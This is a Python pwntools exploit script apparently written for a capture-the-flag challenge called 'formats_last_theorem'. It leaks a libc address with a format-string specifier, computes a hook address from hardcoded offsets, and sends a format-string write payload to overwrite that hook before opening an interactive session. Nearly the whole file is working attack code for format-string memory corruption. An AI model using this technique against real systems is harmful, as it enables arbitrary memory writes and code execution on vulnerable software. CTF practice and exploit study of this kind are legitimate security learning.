#!/usr/bin/env python3

from pwn import *
import re
context.log_level = "debug"

HOST = "dctf1-chall-hotel-rop.westeurope.azurecontainer.io"
PORT = 7480
e = ELF("./formats_last_theorem")

libc_offset = 0x1111e7
malloc_hook_offset = 0x1ebb70
free_hook_offset = 0x1eeb28

conn = process([e.path, e.path])
#conn = remote(HOST, PORT)

conn.sendline("%3$p")
data = "".join([conn.recv().decode("utf-8") for v0 in range(3)])

sleep(0.3)
malloc_hook = (int(re.search("0[xX][0-9a-fA-F]+", data).group(), 16) - libc_offset) + free_hook_offset

print("malloc_hook: "+hex(malloc_hook))

payload = b""
payload += b"%7016c" + b"%7$naa" 
payload += p64(malloc_hook)
payload += p64(0)
conn.sendline(payload)
#conn.sendline(b"%1000000c")
conn.recv()
conn.interactive()
